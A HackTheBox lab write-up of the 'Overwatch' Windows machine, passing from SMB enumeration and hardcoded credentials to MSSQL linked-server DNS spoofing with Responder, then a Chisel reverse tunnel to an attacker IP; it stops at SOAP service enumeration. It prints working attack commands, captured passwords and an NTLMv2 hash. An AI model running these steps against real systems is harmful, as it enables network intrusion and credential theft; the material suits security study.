---
title: "Overwatch"
date: 2026-05-09 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [MSSQL, LinkedServer-Spoofing, Monitoring-Service, SOAP]
description: Writeup for HackTheBox Overwatch machine
image:
  path: assets/img/overwatch/overwatch.png
  alt: HTB Overwatch
---

### Nmap Scan

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN dc2_nmap.scan
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 20:40 +0500
Nmap scan report for 10.129.38.246
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-11 15:40:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-11T15:41:47+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-11T15:41:07+00:00
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2026-05-10T15:34:33
|_Not valid after:  2026-11-09T15:34:33
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-11T15:36:44
|_Not valid after:  2056-05-11T15:36:44
| ms-sql-info: 
|   10.129.38.246:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ms-sql-ntlm-info: 
|   10.129.38.246:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-05-11T15:41:47+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54997/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54998/tcp open  msrpc         Microsoft Windows RPC
55928/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-11T15:41:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

SMB service is running on port 445, MSSQL is running on port 6520. From LDAP enumeration, we found domain name is **overwatch.htb** and from RDP, MSSQL we found the host DNS name is **S200401.overwatch.htb**

Adding domain and hostname to /etc/hosts

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ echo "$ip     S200401.overwatch.htb overwatch.htb S200401" | sudo tee -a /etc/hosts
```

### sqlsvc Account Credentials

SMB Null auth is allowed

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ netexec smb $ip                     
SMB         10.129.38.246   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

Using guest logon to enumerate shares

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ netexec smb $ip -u guest -p '' --shares                         
SMB         10.129.38.246   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.246   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.38.246   445    S200401          [*] Enumerated shares
SMB         10.129.38.246   445    S200401          Share           Permissions     Remark
SMB         10.129.38.246   445    S200401          -----           -----------     ------
SMB         10.129.38.246   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.38.246   445    S200401          C$                              Default share
SMB         10.129.38.246   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.38.246   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.38.246   445    S200401          software$       READ            
SMB         10.129.38.246   445    S200401          SYSVOL                          Logon server share 
```

**guest** account has READ permission on a non default share **software$**. Found an executable **overwatch.exe** in **software\$** share

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ smbclient -U overwatch.htb\\guest%'' //S200401.overwatch.htb/software\$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Sat May 17 06:27:07 2025
  ..                                DHS        0  Thu Jan  1 11:46:47 2026
  Monitoring                         DH        0  Sat May 17 06:32:43 2025

                7147007 blocks of size 4096. 2277588 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 06:32:43 2025
  ..                                 DH        0  Sat May 17 06:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 01:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 01:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 01:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 01:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 19:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 06:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 06:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 06:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 01:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 01:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 01:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 23:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 19:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 19:46:10 2017
  x64                                DH        0  Sat May 17 06:32:33 2025
  x86                                DH        0  Sat May 17 06:32:33 2025

                7147007 blocks of size 4096. 2277588 blocks available
smb: \Monitoring\> smb: \Monitoring\> get overwatch.exe
getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
```

**overwatch.exe** is a 64 bit .NET assembly

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ file overwatch.exe                                                                         
overwatch.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections
```

Using ILSPY to decompile the assembly. Found credentials **sqlsvc:TI0LKcfHzZw1Vv**. Using **sqlsvc** account the program makes connection to database **SecurityLogs** and read url from urls table and insert an event in EventLog table

<img src="assets/img/overwatch/ilspy.png" alt="error loading image">

These credentials **sqlsvc:TI0LKcfHzZw1Vv** are valid to authenticate to domain

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ netexec smb $ip -u guest -p '' --shares                         
SMB         10.129.38.246   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.246   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1V
```

Collect data for bloodhound

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ bloodhound-ce-python -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d "overwatch.htb" -c All -dc S200401.overwatch.htb -ns $ip --zip
```

### MSSQL Linked Server Spoofing

Connect to MSSQL using **sqlsvc** account credentials

```
┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ netexec mssql $ip --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv'             
MSSQL       10.129.38.246   6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (EncryptionReq:False)                                                                                                                                               
MSSQL       10.129.38.246   6520   S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv

┌──(kali㉿kali)-[~/HTB/AD/OverWatch]
└─$ impacket-mssqlclient overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -port 6520 -windows-auth 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands

SQL (OVERWATCH\sqlsvc  guest@master)> select name from master..sysdatabases
name        
---------   
master      
tempdb      
model       
msdb        
overwatch
```
Enumerated **overwatch** database, but didn't found any valuable data

```
SQL (OVERWATCH\sqlsvc  guest@master)> USE overwatch
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.

SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select table_name from information_schema.tables
table_name   
----------   
Eventlog     
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select * from Eventlog
Id   Timestamp   EventType   Details   
--   ---------   ---------   ------- 

SQL (OVERWATCH\sqlsvc  dbo@overwatch)> 
```

Two types of impersonation in MSSQL

1) **LOGIN Impersonation:** Re-authenticate at SERVER level, Changes who you are everywhere

2) **USER Impersonation:** Switch identity at DATABASE level only, Stays within current database. Users you can impersonate (database level)

Find whether **sqlsvc** account can impersonate USER or LOGIn

```
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT b.name FROM sys.database_permissions a JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
----   
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
----   
SQL (OVERWATCH\sqlsvc  guest@master)>
```

Found, that MSSQL instance **S200401\SQLEXPRESS** is linked to instance **SQL07**

```
SQL (OVERWATCH\sqlsvc  guest@master)> select SRVNAME, PROVIDERNAME, SRVPRODUCT, DATASOURCE, PROVIDERSTRING, LOCATION, ISREMOTE from master..sysservers
SRVNAME              PROVIDERNAME   SRVPRODUCT   DATASOURCE           PROVIDERSTRING   LOCATION   ISREMOTE   
------------------   ------------   ----------   ------------------   --------------   --------   --------   
S200401\SQLEXPRESS   SQLOLEDB       SQL Server   S200401\SQLEXPRESS   NULL             NULL              1   
SQL07                SQLOLEDB       SQL Server   SQL07                NULL             NULL              0   
```

The instance **SQL07** is not be reachable by **S200401\SQLEXPRESS**

```
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_testlinkedserver "SQL07"
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].

SQL (OVERWATCH\sqlsvc  guest@master)> EXEC ('SELECT @@SERVERNAME') AT [SQL07]
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
```

**SQL07.overwatch.htb** does not exist in DNS database 

```
┌──(kali㉿kali)-[~/Pentesting/Tools/adidnsdump]
└─$ adidnsdump $ip -u Overwatch\\sqlsvc -p 'TI0LKcfHzZw1Vv' -r      
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 10 records, saving to records.csv
                                                                                                                                                 
┌──(kali㉿kali)-[~/Pentesting/Tools/adidnsdump]
└─$ cat records.csv 
type,name,value
AAAA,s200401,dead:beef::c529:1d06:11a:d89e
AAAA,s200401,dead:beef::233
A,s200401,10.129.38.246
A,ForestDnsZones,10.129.38.246
A,DomainDnsZones,10.129.38.246
NS,_msdcs,s200401.overwatch.htb.
AAAA,@,dead:beef::c529:1d06:11a:d89e
AAAA,@,dead:beef::233
NS,@,s200401.overwatch.htb.
A,@,10.129.38.246
```

Each user in Active Directory domain can add DNS record with a condition that new record can't modify the old one which is not created by the user.

**Abuse Info:** We will add a malicious DNS record **SQL07.overwatch.htb** that points to our VM, then we will excute a query on linked server **SQL07** and catch the credentials with responder

Add the DNS record **SQL07.overwatch.htb**

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ ./dnstool.py S200401.overwatch.htb -u overwatch\\sqlsvc -p 'TI0LKcfHzZw1Vv' -dc-ip $ip -dns-ip $ip -a add -r SQL07.overwatch.htb -d 10.10.15.113
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ ./dnstool.py S200401.overwatch.htb -u overwatch\\sqlsvc -p 'TI0LKcfHzZw1Vv' -dc-ip $ip -dns-ip $ip -a query -r SQL07.overwatch.htb   
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record SQL07
DC=SQL07,DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 241)
 - Address: 10.10.15.113
```

Setup a responder

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ sudo responder -I tun0
```

Excute a query at linked server SQL07. We got credentials **sqlmgmt:bIhBbzMMnB82yx**

```
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC ('select @@version') AT [SQL07]
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.

Responder window:
[MSSQL] Cleartext Client   : 10.129.38.246
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

A question arises, Why we need to add DNS record ? We can simple use **xp_dirtree** providing a UNC path pointin to our VM and catch the credentials, Why absence of linked server record is necessary for above exploit ?

When SQL Server tried to resolve UNC path, it used machine account authentication to connect to specified path. S200401$ is the machine account of the SQL Server host

```
Responder window:
[SMB] NTLMv2-SSP Client   : 10.129.38.246
[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:3da269f2f8f54f77:8BB5DD972C73AEB94F634E204BFD3C80:01010000000000000070D76E9DE1DC0178793F4395EF6FE10000000002000800410039004F00450001001E00570049004E002D0041004C0059004300340037003300350035005500350004003400570049004E002D0041004C005900430034003700330035003500550035002E00410039004F0045002E004C004F00430041004C0003001400410039004F0045002E004C004F00430041004C0005001400410039004F0045002E004C004F00430041004C00070008000070D76E9DE1DC01060004000200000008003000300000000000000000000000003000004118DA3007594A59B843215F0ED9E124DC5929AFD93CE0949B6C73ADB9145B880A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100310033000000000000000000
```

In second case, Linked server SQL07 is configured with stored credentials (not Windows auth). When SQL Server S200401\Express tried to connect to SQL07, it sent credentials in plaintext over MSSQL protocol.

**sqlmgmt** is in **Remote Management Users** group

<img src="assets/img/overwatch/sqlmgmt_rmu.png" alt="error loading image">

#### User Flag

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ evil-winrm-py -i $ip -u sqlmgmt -p 'bIhBbzMMnB82yx'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

evil-winrm-py PS C:\Users\sqlmgmt\Documents> cat ..\Desktop\user.txt
*************1c5a9bdca7265b5467
```

### Privilege Escalation

#### Discovery of Hidden Service

After compromising the **sqlmgmt** account via MSSQL exploitation, we need to escalate privileges to Administrator. The first step is to enumerate internal services running on the compromised host.

**Network Reconnaissance:** We identify an internal HTTP service listening on port 8000, which is only accessible from localhost (127.0.0.1). This port is not directly reachable from the attack machine, so we need to establish a port forwarding tunnel.

We use netstat to enumerate all listening ports on the compromised system:

```
evil-winrm-py PS C:\Users\sqlmgmt\Documents> netstat -ano | findstr TCP
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       828
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2884
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       536
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1160
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1564
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2176
  TCP    0.0.0.0:54997          0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:54998          0.0.0.0:0              LISTENING       2856
  TCP    0.0.0.0:55001          0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:55928          0.0.0.0:0              LISTENING       696
  TCP    0.0.0.0:56084          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:58654          0.0.0.0:0              LISTENING       2972
  TCP    0.0.0.0:61166          0.0.0.0:0              LISTENING       2036
  TCP    10.129.38.246:53       0.0.0.0:0              LISTENING       2036
  TCP    10.129.38.246:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.38.246:5985     10.10.15.113:48708     ESTABLISHED     4
  TCP    10.129.38.246:6520     10.10.15.113:50694     ESTABLISHED     700
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2036
  TCP    [::]:88                [::]:0                 LISTENING       696
  TCP    [::]:135               [::]:0                 LISTENING       932
  TCP    [::]:389               [::]:0                 LISTENING       696
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       696
  TCP    [::]:593               [::]:0                 LISTENING       932
  TCP    [::]:636               [::]:0                 LISTENING       696
  TCP    [::]:3268              [::]:0                 LISTENING       696
  TCP    [::]:3269              [::]:0                 LISTENING       696
  TCP    [::]:3389              [::]:0                 LISTENING       828
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:6520              [::]:0                 LISTENING       700
  TCP    [::]:8000              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2884
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       696
  TCP    [::]:49665             [::]:0                 LISTENING       536
  TCP    [::]:49666             [::]:0                 LISTENING       1160
  TCP    [::]:49667             [::]:0                 LISTENING       1564
  TCP    [::]:49668             [::]:0                 LISTENING       696
  TCP    [::]:49670             [::]:0                 LISTENING       2176
  TCP    [::]:54997             [::]:0                 LISTENING       696
  TCP    [::]:54998             [::]:0                 LISTENING       2856
  TCP    [::]:55001             [::]:0                 LISTENING       680
  TCP    [::]:55928             [::]:0                 LISTENING       696
  TCP    [::]:56084             [::]:0                 LISTENING       700
  TCP    [::]:58654             [::]:0                 LISTENING       2972
  TCP    [::]:61166             [::]:0                 LISTENING       2036
  TCP    [::1]:53               [::]:0                 LISTENING       2036
  TCP    [::1]:389              [::1]:54999            ESTABLISHED     696
  TCP    [::1]:389              [::1]:55000            ESTABLISHED     696
  TCP    [::1]:389              [::1]:61165            ESTABLISHED     696
  TCP    [::1]:54999            [::1]:389              ESTABLISHED     3020
  TCP    [::1]:55000            [::1]:389              ESTABLISHED     3020
  TCP    [::1]:61165            [::1]:389              ESTABLISHED     2036
  TCP    [dead:beef::233]:53    [::]:0                 LISTENING       2036
  TCP    [dead:beef::c529:1d06:11a:d89e]:53  [::]:0                 LISTENING       2036
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:53  [::]:0                 LISTENING       2036
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:135  [fe80::1d63:a64a:1cf:edd6%3]:61162  ESTABLISHED     932
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:389  [fe80::1d63:a64a:1cf:edd6%3]:58649  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:389  [fe80::1d63:a64a:1cf:edd6%3]:58652  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:49668  [fe80::1d63:a64a:1cf:edd6%3]:55941  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:49668  [fe80::1d63:a64a:1cf:edd6%3]:58660  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:49668  [fe80::1d63:a64a:1cf:edd6%3]:58793  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:52059  [fe80::1d63:a64a:1cf:edd6%3]:135  TIME_WAIT       0
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:55941  [fe80::1d63:a64a:1cf:edd6%3]:49668  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:58649  [fe80::1d63:a64a:1cf:edd6%3]:389  ESTABLISHED     2972
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:58652  [fe80::1d63:a64a:1cf:edd6%3]:389  ESTABLISHED     2972
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:58660  [fe80::1d63:a64a:1cf:edd6%3]:49668  ESTABLISHED     2972
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:58793  [fe80::1d63:a64a:1cf:edd6%3]:49668  ESTABLISHED     696
  TCP    [fe80::1d63:a64a:1cf:edd6%3]:61162  [fe80::1d63:a64a:1cf:edd6%3]:135  ESTABLISHED     696
```

#### Port Forwarding with Chisel

The internal service on port 8000 is only bound to localhost (127.0.0.1), making it inaccessible from our attack machine. To interact with it, we establish a reverse tunnel using Chisel, a tool that creates encrypted tunnels over HTTP/HTTPS.

**Step 1:** Upload Chisel binary to the target

```
evil-winrm-py PS C:\Users\sqlmgmt\Documents> upload /home/kali/Pentesting/Tools/chisel_1.11.3.exe chisel.exe  
[+] File uploaded successfully as: C:\Users\sqlmgmt\Documents\chisel.exe
```

**Step 2:** Start Chisel server in reverse mode on attack machine

```
┌──(kali㉿kali)-[~/Pentesting/Tools]
└─$ ./chisel_1.11.3 server --reverse --port 4000 
2026/05/12 00:19:37 server: Reverse tunnelling enabled
2026/05/12 00:19:37 server: Fingerprint L28RAgRFQAfyYiwzU4gzvRvtlGwmj9OGXGXKtdyryYE=
2026/05/12 00:19:37 server: Listening on http://0.0.0.0:4000
2026/05/12 00:19:54 server: session#1: tun: proxy#R:8000=>8000: Listening
```

**Step 3:** From target, connect back to our Chisel server, establishing the reverse tunnel

```
evil-winrm-py PS C:\Users\sqlmgmt\Documents> ./chisel client 10.10.15.113:4000 R:8000:127.0.0.1:8000
```

This command creates a tunnel: incoming connections to `127.0.0.1:8000` on the target are forwarded back to our attack machine's `8000` port.

#### Enumerating the Monitoring Service

We now have access to the internal service. It is an HTTP service running on port 8000.

**Initial service verification with nmap:**

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ nmap 127.0.0.1 -p 8000  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 00:25 +0500
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt 
```

To get more information about what services are registered on the HTTP.sys kernel driver (Windows' low-level HTTP listener), we use netsh

```
evil-winrm-py PS C:\Users\sqlmgmt\Documents> netsh http show servicestate

Snapshot of HTTP service state (Server Session View): 
----------------------------------------------------- 

Server session ID: FF00000010000001
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: FE00000020000001
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 2
            Registered URLs:
                HTTP://+:5985/WSMAN/
                HTTP://+:47001/WSMAN/

Server session ID: FD00000010000001
    Version: 2.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: FC00000020000001
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://+:8000/MONITORSERVICE/

Request queues:
    Request queue name: Request queue is unnamed.
        Version: 1.0
        State: Active
        Request queue 503 verbosity level: Basic
        Max requests: 1000
        Number of active processes attached: 1
        Processes:
            ID: 1412, image: <?>
        Registered URLs:
            HTTP://+:5985/WSMAN/
            HTTP://+:47001/WSMAN/

    Request queue name: Request queue is unnamed.
        Version: 2.0
        State: Active
        Request queue 503 verbosity level: Basic
        Max requests: 1000
        Number of active processes attached: 1
        Processes:
            ID: 4796, image: <?>
        Registered URLs:
            HTTP://+:8000/MONITORSERVICE/
```

**Key Finding:** Process ID 4796 is running a Windows service on `HTTP://+:8000/MONITORSERVICE/`. The HTTP.sys kernel driver is routing all requests to this endpoint. The `+` means it's listening on all interfaces, but based on earlier netstat output, it's bound only to localhost.

#### Attacking the SOAP Service

The service is a SOAP (Simple Object Access Protocol) web service. SOAP is an XML-based protocol for exchanging structured information over HTTP. To understand the service's capabilities, we request the WSDL (Web Services Description Language) - a blueprint describing available operations.

**Retrieve WSDL specification:**

```
┌──(kali㉿kali)-[~/Pentesting/Tools/krbrelayx]
└─$ curl -s 'http://localhost:8000/MonitorService?wsdl' | xq
<?xml version="1.0" encoding="utf-8"?>
